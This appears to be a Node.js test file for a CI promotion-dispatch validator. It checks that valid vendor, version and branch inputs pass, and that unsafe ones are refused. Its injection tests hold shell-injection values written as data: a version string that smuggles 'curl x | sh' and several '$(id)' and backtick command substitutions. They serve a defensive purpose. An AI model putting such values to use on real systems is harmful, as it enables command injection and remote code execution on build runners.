import assert from 'node:assert/strict';
import test from 'node:test';
import { validatePromotionDispatch } from './validate-promotion-dispatch.mjs';

const dispatch = (overrides = {}) => ({
  AGENT_VENDOR: 'grok',
  AGENT_VERSION: '1.0.70',
  AGENT_SOURCE_REFERENCE: '',
  AGENT_GROUND_TRUTH: 'packages/surface/vendors/grok/groundtruth.json',
  AGENT_CONFIRM: 'promote',
  GITHUB_REF_TYPE: 'branch',
  GITHUB_REF_NAME: 'adapt/upstream-claude-codex-grok',
  DEFAULT_BRANCH: 'main',
  ...overrides,
});

test('a rehearsal or promotion of an exact candidate on a candidate branch is accepted', () => {
  assert.deepEqual(validatePromotionDispatch({ environment: dispatch() }), []);
  assert.deepEqual(
    validatePromotionDispatch({ environment: dispatch({ AGENT_CONFIRM: 'rehearse', GITHUB_REF_NAME: 'main' }) }),
    [],
  );
  assert.deepEqual(
    validatePromotionDispatch({
      environment: dispatch({
        AGENT_VENDOR: 'hermes',
        AGENT_VERSION: '0.20.0',
        AGENT_SOURCE_REFERENCE: 'v2026.8.3',
        AGENT_GROUND_TRUTH: 'packages/surface/vendors/hermes/groundtruth.json',
      }),
    }),
    [],
  );
});

test('an input that could break out of a run: line on any runner shell is refused before any lane', () => {
  for (const [name, value, issue] of [
    ['AGENT_VERSION', '1.0.70"; curl x | sh; "', 'version must be an exact normalized vendor version'],
    ['AGENT_VERSION', '$(id)', 'version must be an exact normalized vendor version'],
    ['AGENT_SOURCE_REFERENCE', 'v1 $(id)', 'source_reference must be empty or an exact release tag'],
    ['AGENT_SOURCE_REFERENCE', '`id`', 'source_reference must be empty or an exact release tag'],
    [
      'AGENT_GROUND_TRUTH',
      './packages/surface/vendors/grok/groundtruth.json',
      'ground_truth must be exactly packages/surface/vendors/grok/groundtruth.json',
    ],
    ['AGENT_CONFIRM', 'PROMOTE', 'confirm must be rehearse or promote'],
  ]) {
    assert.deepEqual(validatePromotionDispatch({ environment: dispatch({ [name]: value }) }), [issue], value);
  }
  assert.deepEqual(validatePromotionDispatch({ environment: dispatch({ AGENT_VENDOR: 'nobody' }) }), [
    'vendor nobody has no upstream platform policy',
    'ground_truth must be exactly packages/surface/vendors/nobody/groundtruth.json',
  ]);
});

test('a promotion is refused where its push can never land', () => {
  assert.deepEqual(validatePromotionDispatch({ environment: dispatch({ GITHUB_REF_NAME: 'main' }) }), [
    'a promotion never runs on the default branch: its protection rejects the workflow push; dispatch it from the candidate branch',
  ]);
  assert.deepEqual(validatePromotionDispatch({ environment: dispatch({ GITHUB_REF_TYPE: 'tag' }) }), [
    'a promotion commits to the branch it was dispatched from; dispatch it from a branch',
  ]);
});
